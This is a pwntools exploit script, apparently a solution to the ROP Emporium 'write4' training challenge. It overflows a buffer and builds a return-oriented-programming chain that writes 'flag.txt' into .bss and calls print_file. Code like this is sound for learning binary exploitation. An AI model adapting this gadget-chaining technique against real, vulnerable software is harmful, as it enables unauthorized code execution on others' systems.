#!/bin/python3
from pwn import *
from Crypto.Util.number import bytes_to_long

p = process('./write4')
e = ELF('./write4')
r = ROP('./write4')

offset = 0x7ffca4bda698 - 0x7ffca4bda670

payload = b'A'*offset

payload += p64(r.find_gadget(['pop r14','pop r15','ret']).address) # we will pop bss into r14 and flag.txt into r15
payload += p64(e.bss()) # addr of readable and writable empty section that is big enough for "flag.txt" (can also use .data)
assert(bytes_to_long(e.section('.bss')) == 0) # section should be empty

payload += b'flag.txt'

payload += p64(0x400628) # mov [r14], r15 gadget. Move 'flag.txt' into address in r14 (bss)
payload += p64(r.find_gadget(['pop rdi', 'ret']).address) # pop bss into rdi (which is now flag.txt)
payload += p64(e.bss()) 
payload += p64(e.plt['print_file']) # call print_file with value in rdi, (which is flag.txt)

p.sendline(payload)

p.interactive()